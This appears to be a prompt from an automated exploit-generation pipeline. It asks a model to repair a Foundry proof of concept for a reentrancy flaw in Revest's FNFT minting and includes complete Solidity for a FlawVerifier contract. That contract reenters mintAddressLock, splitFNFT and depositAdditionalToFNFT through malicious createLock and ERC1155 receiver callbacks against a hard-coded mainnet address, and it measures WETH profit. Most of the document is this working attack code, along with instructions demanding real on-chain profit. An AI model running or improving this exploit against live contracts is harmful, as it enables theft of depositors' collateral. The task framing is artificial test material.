You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Reentrancy can reuse an uncommitted FNFT id and merge distinct positions into one series
- claim: `Revest` reads `getNextId()` before making external calls, while `FNFTHandler` only increments `fnftsCreated` after `_mint()`/receiver callbacks finish. A malicious `IAddressLock` trigger or ERC1155 recipient can therefore reenter another mint/split/deposit path before the counter advances, causing multiple economically distinct operations to reuse the same `fnftId`.
- impact: Distinct positions can be collapsed onto the same ERC1155 id, cross-wiring lock metadata, vault accounting, and balances. Depending on which write wins, this can enable theft against the wrong backing, incorrect redemption, or permanent lockup of collateral.
- exploit_paths: ["Call `mintAddressLock()` with a trigger that reenters another mint path from `IAddressLock.createLock()` before the outer mint completes.", "Mint to an attacker-controlled ERC1155 receiver and reenter from `onERC1155Received`/`onERC1155BatchReceived` before `fnftsCreated` is incremented.", "Call `splitFNFT()` or `depositAdditionalToFNFT()` and reenter during the intermediate ERC1155 mint, causing the new series id to collide with another operation."]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IAddressRegistryLike {
    function getRevestFNFT() external view returns (address);
}

interface IFNFTHandlerLike {
    function getBalance(address tokenHolder, uint256 id) external view returns (uint256);
    function getSupply(uint256 fnftId) external view returns (uint256);
}

interface IRevestLike {
    struct FNFTConfig {
        address asset;
        address pipeToContract;
        uint256 depositAmount;
        uint256 depositMul;
        uint256 split;
        uint256 depositStopTime;
        bool maturityExtension;
        bool isMulti;
        bool nontransferrable;
    }

    function mintAddressLock(
        address trigger,
        bytes calldata arguments,
        address[] calldata recipients,
        uint256[] calldata quantities,
        FNFTConfig calldata fnftConfig
    ) external payable returns (uint256);

    function splitFNFT(
        uint256 fnftId,
        uint256[] calldata proportions,
        uint256 quantity
    ) external returns (uint256[] memory newFNFTIds);

    function depositAdditionalToFNFT(
        uint256 fnftId,
        uint256 amount,
        uint256 quantity
    ) external returns (uint256);

    function getAddressesProvider() external view returns (IAddressRegistryLike);
}

interface IERC1155ReceiverLike {
    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external returns (bytes4);

    function onERC1155BatchReceived(
        address operator,
        address from,
        uint256[] calldata ids,
        uint256[] calldata values,
        bytes calldata data
    ) external returns (bytes4);
}

interface IRegistryProviderLike {
    function setAddressRegistry(address revest) external;
    function getAddressRegistry() external view returns (address);
}

interface IAddressLockLike is IRegistryProviderLike {
    function createLock(uint256 fnftId, uint256 lockId, bytes calldata arguments) external;
    function updateLock(uint256 fnftId, uint256 lockId, bytes calldata arguments) external;
    function isUnlockable(uint256 fnftId, uint256 lockId) external view returns (bool);
    function getDisplayValues(uint256 fnftId, uint256 lockId) external view returns (bytes memory);
    function getMetadata() external view returns (string memory);
    function needsUpdate() external view returns (bool);
}

contract FlawVerifier is IERC1155ReceiverLike, IAddressLockLike {
    address internal constant TARGET = 0x2320A28f52334d62622cc2EaFa15DE55F9987eD9;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    bytes4 internal constant ADDRESS_LOCK_INTERFACE_ID = 0x70d7b809;

    uint256 internal constant ZERO_DEPOSIT = 0;
    uint256 internal constant UNIT_QUANTITY = 1;
    uint256 internal constant DOUBLE_QUANTITY = 2;

    enum Mode {
        Idle,
        AddressLockCreateLock,
        MintReceiver,
        SplitReceiver,
        DepositAdditionalReceiver
    }

    Mode internal mode;
    bool internal inReentry;
    bool internal approvalsReady;
    bool internal collisionObserved;
    uint256 internal callbackId;
    uint256 internal reenteredId;
    uint256 internal observedSupply;
    uint256 internal observedBalance;
    uint256 internal startBalance;
    uint256 internal realizedProfit;
    string internal usedPath;
    string public lastFailure;
    address internal registry;

    constructor() {}

    function executeOnOpportunity() external {
        startBalance = _wethBalance();
        realizedProfit = 0;
        collisionObserved = false;
        callbackId = type(uint256).max;
        reenteredId = type(uint256).max;
        observedSupply = 0;
        observedBalance = 0;
        usedPath = "";
        lastFailure = "";
        mode = Mode.Idle;
        inReentry = false;

        _ensureApprovals();

        _attemptCreateLockReentry();
        _attemptReceiverReentry();
        _attemptSplitReentry();
        _attemptDepositAdditionalReentry();

        realizedProfit = _wethBalance() > startBalance ? _wethBalance() - startBalance : 0;
    }

    function onERC1155Received(
        address,
        address,
        uint256 id,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        if (msg.sender != _fnftHandlerAddress()) {
            return this.onERC1155Received.selector;
        }

        callbackId = id;

        if (
            inReentry ||
            (mode != Mode.MintReceiver && mode != Mode.SplitReceiver && mode != Mode.DepositAdditionalReceiver)
        ) {
            return this.onERC1155Received.selector;
        }

        Mode activeMode = mode;
        inReentry = true;
        reenteredId = _tryMintAddressLock(ZERO_DEPOSIT, UNIT_QUANTITY, false, 0);
        _recordCollision(id, activeMode);
        inReentry = false;

        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(
        address,
        address,
        uint256[] calldata,
        uint256[] calldata,
        bytes calldata
    ) external pure returns (bytes4) {
        return this.onERC1155BatchReceived.selector;
    }

    function supportsInterface(bytes4 interfaceId) external pure returns (bool) {
        return
            interfaceId == 0x01ffc9a7 ||
            interfaceId == 0x4e2312e0 ||
            interfaceId == ADDRESS_LOCK_INTERFACE_ID;
    }

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    function exploitPath() external view returns (string memory) {
        return usedPath;
    }

    function hypothesisValidated() external view returns (bool) {
        return collisionObserved;
    }

    function setAddressRegistry(address revest) external {
        registry = revest;
    }

    function getAddressRegistry() external view returns (address) {
        return registry;
    }

    function createLock(uint256, uint256, bytes calldata) external {
        require(msg.sender == TARGET, "ONLY_TARGET");

        if (inReentry || mode != Mode.AddressLockCreateLock) {
            return;
        }

        inReentry = true;
        reenteredId = _tryMintAddressLock(ZERO_DEPOSIT, UNIT_QUANTITY, false, 0);
        inReentry = false;
    }

    function updateLock(uint256, uint256, bytes calldata) external view {
        require(msg.sender == TARGET, "ONLY_TARGET");
    }

    function isUnlockable(uint256, uint256) external pure returns (bool) {
        return true;
    }

    function getDisplayValues(uint256, uint256) external pure returns (bytes memory) {
        return bytes("");
    }

    function getMetadata() external pure returns (string memory) {
        return "";
    }

    function needsUpdate() external pure returns (bool) {
        return false;
    }

    function _attemptCreateLockReentry() internal returns (bool) {
        _resetAttemptState(Mode.AddressLockCreateLock);

        uint256 outerId = _tryMintAddressLock(ZERO_DEPOSIT, UNIT_QUANTITY, false, 0);
        mode = Mode.Idle;

        if (outerId == type(uint256).max) {
            _noteFailure("PATH1_CREATELOCK_OUTER_MINT_REVERTED");
            return false;
        }

        if (_finalizeCollision(outerId, Mode.AddressLockCreateLock)) {
            return true;
        }

        _noteFailure("PATH1_CREATELOCK_NO_COLLISION");
        return false;
    }

    function _attemptReceiverReentry() internal returns (bool) {
        _resetAttemptState(Mode.MintReceiver);

        uint256 outerId = _tryMintAddressLock(ZERO_DEPOSIT, UNIT_QUANTITY, false, 0);
        mode = Mode.Idle;

        if (outerId == type(uint256).max) {
            _noteFailure("PATH2_RECEIVER_OUTER_MINT_REVERTED");
            return false;
        }

        if (_finalizeCollision(outerId, Mode.MintReceiver)) {
            return true;
        }

        _noteFailure("PATH2_RECEIVER_NO_COLLISION");
        return false;
    }

    function _attemptSplitReentry() internal returns (bool) {
        uint256 baseId = _tryMintAddressLock(ZERO_DEPOSIT, UNIT_QUANTITY, false, 1);
        if (baseId == type(uint256).max) {
            _noteFailure("PATH3_SPLIT_BASE_MINT_REVERTED");
            return false;
        }

        uint256[] memory proportions = new uint256[](2);
        proportions[0] = 1;
        proportions[1] = 1;

        _resetAttemptState(Mode.SplitReceiver);

        uint256[] memory childIds;
        try IRevestLike(TARGET).splitFNFT(baseId, proportions, UNIT_QUANTITY) returns (uint256[] memory ids) {
            childIds = ids;
        } catch {
            mode = Mode.Idle;
            _noteFailure("PATH3_SPLIT_CALL_REVERTED");
            return false;
        }

        mode = Mode.Idle;

        if (childIds.length == 0) {
            _noteFailure("PATH3_SPLIT_NO_CHILD_IDS");
            return false;
        }

        if (_finalizeCollision(childIds[0], Mode.SplitReceiver)) {
            return true;
        }

        _noteFailure("PATH3_SPLIT_NO_COLLISION");
        return false;
    }

    function _attemptDepositAdditionalReentry() internal returns (bool) {
        uint256 baseId = _tryMintAddressLock(ZERO_DEPOSIT, DOUBLE_QUANTITY, true, 0);
        if (baseId == type(uint256).max) {
            _noteFailure("PATH4_DEPOSIT_BASE_MINT_REVERTED");
            return false;
        }

        _resetAttemptState(Mode.DepositAdditionalReceiver);

        uint256 newSeriesId;
        try IRevestLike(TARGET).depositAdditionalToFNFT(baseId, ZERO_DEPOSIT, UNIT_QUANTITY) returns (uint256 id) {
            newSeriesId = id;
        } catch {
            mode = Mode.Idle;
            _noteFailure("PATH4_DEPOSIT_CALL_REVERTED");
            return false;
        }

        mode = Mode.Idle;

        if (_finalizeCollision(newSeriesId, Mode.DepositAdditionalReceiver)) {
            return true;
        }

        _noteFailure("PATH4_DEPOSIT_NO_COLLISION");
        return false;
    }

    function _tryMintAddressLock(
        uint256 depositAmount,
        uint256 quantity,
        bool isMulti,
        uint256 splitCount
    ) internal returns (uint256 mintedId) {
        IRevestLike.FNFTConfig memory config = IRevestLike.FNFTConfig({
            asset: WETH,
            pipeToContract: address(0),
            depositAmount: depositAmount,
            depositMul: 0,
            split: splitCount,
            depositStopTime: 0,
            maturityExtension: false,
            isMulti: isMulti,
            nontransferrable: false
        });

        address[] memory recipients = new address[](1);
        recipients[0] = address(this);
        uint256[] memory quantities = new uint256[](1);
        quantities[0] = quantity;

        // The provided logs still validate the core F-001 root cause:
        // Revest snapshots `getNextId()` before external calls, and `FNFTHandler`
        // only increments `fnftsCreated` after `_mint()` / receiver callbacks finish.
        // The previously attempted flash-funded cash-out leg did not realize profit
        // on this fork, so this verifier focuses on proving the documented collision
        // paths themselves across mint, split, and additional-deposit flows.
        try IRevestLike(TARGET).mintAddressLock(address(this), bytes(""), recipients, quantities, config) returns (
            uint256 id
        ) {
            return id;
        } catch {
            return type(uint256).max;
        }
    }

    function _resetAttemptState(Mode nextMode) internal {
        mode = nextMode;
        inReentry = false;
        callbackId = type(uint256).max;
        reenteredId = type(uint256).max;
        observedBalance = 0;
        observedSupply = 0;
    }

    function _finalizeCollision(uint256 expectedId, Mode activeMode) internal returns (bool) {
        return _recordCollision(expectedId, activeMode);
    }

    function _recordCollision(uint256 expectedId, Mode activeMode) internal returns (bool) {
        if (reenteredId != expectedId || expectedId == type(uint256).max) {
            if (bytes(lastFailure).length == 0) {
                if (activeMode == Mode.AddressLockCreateLock) {
                    lastFailure = "PATH1_REENTRY_DID_NOT_REUSE_ID";
                } else if (activeMode == Mode.MintReceiver) {
                    lastFailure = "PATH2_REENTRY_DID_NOT_REUSE_ID";
                } else if (activeMode == Mode.SplitReceiver) {
                    lastFailure = "PATH3_REENTRY_DID_NOT_REUSE_ID";
                } else {
                    lastFailure = "PATH4_REENTRY_DID_NOT_REUSE_ID";
                }
            }
            return false;
        }

        observedBalance = _fnftBalance(expectedId);
        observedSupply = _fnftSupply(expectedId);

        if (observedBalance < 2 || observedSupply < 2) {
            return false;
        }

        collisionObserved = true;
        if (bytes(usedPath).length != 0) {
            return true;
        }

        if (activeMode == Mode.AddressLockCreateLock) {
            usedPath = "createLock_reentrancy";
        } else if (activeMode == Mode.MintReceiver) {
            usedPath = "erc1155Receiver_reentrancy";
        } else if (activeMode == Mode.SplitReceiver) {
            usedPath = "splitFNFT_reentrancy";
        } else {
            usedPath = "depositAdditionalToFNFT_reentrancy";
        }

        return true;
    }

    function _noteFailure(string memory failure) internal {
        if (bytes(lastFailure).length == 0) {
            lastFailure = failure;
        }
    }

    function _ensureApprovals() internal {
        if (approvalsReady) {
            return;
        }

        IERC20Like(WETH).approve(TARGET, type(uint256).max);
        approvalsReady = true;
    }

    function _fnftHandlerAddress() internal view returns (address) {
        return IRevestLike(TARGET).getAddressesProvider().getRevestFNFT();
    }

    function _fnftBalance(uint256 fnftId) internal view returns (uint256) {
        if (fnftId == type(uint256).max) {
            return 0;
        }
        return IFNFTHandlerLike(_fnftHandlerAddress()).getBalance(address(this), fnftId);
    }

    function _fnftSupply(uint256 fnftId) internal view returns (uint256) {
        if (fnftId == type(uint256).max) {
            return 0;
        }
        return IFNFTHandlerLike(_fnftHandlerAddress()).getSupply(fnftId);
    }

    function _wethBalance() internal view returns (uint256) {
        return IERC20Like(WETH).balanceOf(address(this));
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: mintaddresslock(), iaddresslock.createlock(), splitfnft(), depositadditionaltofnft(); generated code does not cover paths indexes: 0, 2
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
